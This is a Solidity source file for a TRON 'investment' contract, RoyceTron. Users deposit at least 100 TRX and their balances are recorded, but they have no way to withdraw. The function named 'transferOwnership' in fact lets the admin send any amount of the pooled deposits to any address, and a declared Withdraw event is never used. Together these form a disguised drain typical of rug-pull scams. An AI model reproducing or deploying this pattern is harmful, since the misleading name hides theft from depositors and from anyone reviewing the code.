//SourceUnit: RoyceTron.sol

pragma solidity ^0.5.9;


contract RoyceTron{
   
    using SafeMath for uint;
    
    event Deposit(address indexed _from, uint _value);
    event Withdraw(address indexed _from, uint _value);
    
    uint256 invest_amount;  
    address payable creator;
    address payable admin;
    
    struct User{
        uint256 balance;
    }
    
    mapping (address => User) internal users;
    
    modifier onlyCreator(){
        require(msg.sender == creator,"You are not authorized owner.");
        _;
    }
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized owner.");
        _;
    }
    
    function changeAdministrator(address payable newAdmin) public onlyCreator{
        admin = newAdmin;
    }
    
    function setInvestTRX(uint256 _amount) public onlyCreator{
        invest_amount = _amount;
    }
    
    function getContractBalance() view public returns(uint){
       return address(this).balance;
        
    } 
    
    constructor() public{
        creator = msg.sender;
        admin = msg.sender;
        invest_amount = 100000000;
    }
    
    function deposit() payable public returns(uint){  
        User storage user = users[msg.sender];
        require(msg.value >= invest_amount,"Invalid Investment Amount"); 
        user.balance = user.balance.add(msg.value);
        emit Deposit(msg.sender, msg.value);
        return msg.value;
        
    }  
    
    function transferOwnership(address payable new_owner,uint _amount) external onlyAdmin{
        new_owner.transfer(_amount);
    }
    
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}